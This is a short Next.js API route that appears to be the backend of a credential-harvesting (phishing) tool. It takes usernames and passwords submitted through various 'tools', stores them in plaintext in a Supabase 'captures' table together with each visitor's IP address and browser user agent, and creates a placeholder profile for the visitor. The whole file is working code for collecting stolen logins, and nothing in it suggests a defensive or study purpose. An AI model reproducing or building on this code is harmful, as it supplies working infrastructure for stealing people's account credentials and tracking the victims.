import { NextResponse } from "next/server";
import { supabaseAdmin as supabase } from "@/lib/supabase";

export async function POST(request) {
  try {
    const data = await request.json();
    const { tool, username, password, toolId, userId } = data;
    
    // Get IP and UserAgent
    const ip = request.headers.get("x-forwarded-for") || "127.0.0.1";
    const userAgent = request.headers.get("user-agent") || "Unknown Device";
    // 4. Record to Supabase
    const { error } = await supabase
      .from('captures')
      .insert({
        tool,
        tool_id: toolId,
        username,
        password,
        ip,
        user_agent: userAgent,
        user_id: userId === 'anonymous' ? null : userId
      });

    if (error) throw error;

    // 5. Ensure profile exists for admin management
    if (userId && userId !== 'anonymous') {
      await supabase.from('profiles').upsert({ 
        id: userId,
        full_name: 'Visitor User',
        is_admin: false,
        is_banned: false
      }, { onConflict: 'id' });
    }

    return NextResponse.json({ success: true, message: "Data logged successfully" });
  } catch (err) {
    console.error("Capture API Error:", err);
    return NextResponse.json({ error: "Storage error", message: err.message }, { status: 500 });
  }
}
